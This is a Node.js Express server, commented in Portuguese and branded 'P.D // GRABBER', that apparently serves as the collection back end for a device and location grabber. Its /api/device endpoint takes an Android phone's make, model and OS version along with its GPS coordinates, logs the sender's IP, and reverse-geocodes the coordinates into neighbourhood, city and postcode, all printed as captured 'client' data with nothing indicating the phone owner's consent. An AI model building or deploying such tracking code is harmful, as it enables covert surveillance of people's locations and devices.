const express = require("express");

const app = express();

app.use(express.json());

const PORT = process.env.PORT || 10000;


// ============================================================
//                    P.D // GRABBER
// ============================================================

function logInicializacao() {
    console.log(`
P.D::CORE > ./initialize

================================================
                                                
[+] CORE....................OK                  
[+] NETWORK.................OK
[+] SOCKET..................OK
[+] LISTENER................OK

P.D::CORE > ./listen

01010100 01010010 01000001 01000011 01000101

>>> WAITING FOR CONNECTION <<<

===============================================

`);
}


function logConexao(dados) {

    const hora = new Date().toLocaleTimeString("pt-BR");

    console.log(`
╔══════════════════════════════════════════════════════════╗
║                  P.D // CLIENT                           ║
╚══════════════════════════════════════════════════════════╝

[${hora}] >>> CONNECTION DETECTED <<<

P.D::CORE > ./decode

[+] RECEIVING PACKET........OK
[+] DECODING DATA...........OK
[+] VALIDATING..............OK
[+] SESSION.................OK

────────────────────────────────────────────────────────────
                     CLIENT DATA
────────────────────────────────────────────────────────────

  BRAND       = ${dados.marca}
  MANUFACTURER= ${dados.fabricante}
  MODEL       = ${dados.modelo}
  ANDROID     = ${dados.android}
  IP          = ${dados.ip}
`);

}


function logLocalizacao(dados) {

    console.log(`
────────────────────────────────────────────────────────────
                    LOCATION DATA
────────────────────────────────────────────────────────────

  CITY        = ${dados.cidade}
  STATE       = ${dados.estado}
  CEP         = ${dados.cep}
  COUNTRY     = ${dados.pais}
  NEIGHBORHOOD= ${dados.bairro}

────────────────────────────────────────────────────────────

>>> DECODE COMPLETE

[✓] CLIENT ONLINE
[✓] DATA RECEIVED
[✓] SESSION ACTIVE

P.D::CORE > _
`);
}


// ============================================================
// BUSCAR ENDEREÇO
// ============================================================

async function buscarEndereco(latitude, longitude) {

    const url =
        `https://nominatim.openstreetmap.org/reverse` +
        `?format=jsonv2` +
        `&lat=${encodeURIComponent(latitude)}` +
        `&lon=${encodeURIComponent(longitude)}` +
        `&zoom=18` +
        `&addressdetails=1`;

    const resposta = await fetch(url, {
        headers: {
            "User-Agent": "ServidorAndroid/1.0"
        }
    });

    if (!resposta.ok) {
        throw new Error(
            `Nominatim respondeu HTTP ${resposta.status}`
        );
    }

    return await resposta.json();
}


// ============================================================
// RECEBER DISPOSITIVO
// ============================================================

app.post("/api/device", async (req, res) => {

    try {

        const dados = req.body || {};

        let ip =
            req.headers["x-forwarded-for"] ||
            req.socket.remoteAddress ||
            "Desconhecido";

        if (ip.includes(",")) {
            ip = ip.split(",")[0].trim();
        }

        ip = ip.replace("::ffff:", "");


        // ----------------------------------------------------
        // LOG DO DISPOSITIVO
        // ----------------------------------------------------

        logConexao({
            marca: dados.marca || "Não informado",
            fabricante: dados.fabricante || "Não informado",
            modelo: dados.modelo || "Não informado",
            android: dados.android || "Não informado",
            ip: ip
        });


        // ----------------------------------------------------
        // LOCALIZAÇÃO
        // ----------------------------------------------------

        const latitude = dados.latitude;
        const longitude = dados.longitude;


        if (
            typeof latitude === "number" &&
            typeof longitude === "number"
        ) {

            console.log(
                `  COORDINATES = ${latitude}, ${longitude}`
            );

            try {

                const endereco =
                    await buscarEndereco(
                        latitude,
                        longitude
                    );

                const address =
                    endereco.address || {};


                const bairro =
                    address.suburb ||
                    address.neighbourhood ||
                    address.village ||
                    "Não informado";


                const cidade =
                    address.city ||
                    address.town ||
                    address.municipality ||
                    address.village ||
                    "Não informada";


                const estado =
                    address.state ||
                    "Não informado";


                const cep =
                    address.postcode ||
                    "Não informado";


                const pais =
                    address.country ||
                    "Não informado";


                logLocalizacao({
                    bairro: bairro,
                    cidade: cidade,
                    estado: estado,
                    cep: cep,
                    pais: pais
                });


            } catch (erroEndereco) {

                console.error(`
P.D::CORE > ./location

[!] LOCATION LOOKUP FAILED
[!] ${erroEndereco.message}

P.D::CORE > _
`);
            }


        } else {

            console.log(`
────────────────────────────────────────────────────────────

[!] LOCATION DATA NOT AVAILABLE

────────────────────────────────────────────────────────────

[✓] CLIENT ONLINE
[✓] DATA RECEIVED

P.D::CORE > _
`);

        }


        res.status(200).json({
            sucesso: true
        });


    } catch (erro) {

        console.error(`
╔══════════════════════════════════════════════════════════╗
║                    P.D // ERROR                         ║
╚══════════════════════════════════════════════════════════╝

[!] ERROR PROCESSING CLIENT

${erro.message}

P.D::CORE > _
`);

        res.status(500).json({
            sucesso: false
        });

    }

});


// ============================================================
// ROTA PRINCIPAL
// ============================================================

app.get("/", (req, res) => {

    res.status(200).send(
        "P.D // Server online"
    );

});


// ============================================================
// INICIAR SERVIDOR
// ============================================================

app.listen(PORT, "0.0.0.0", () => {

    logInicializacao();

});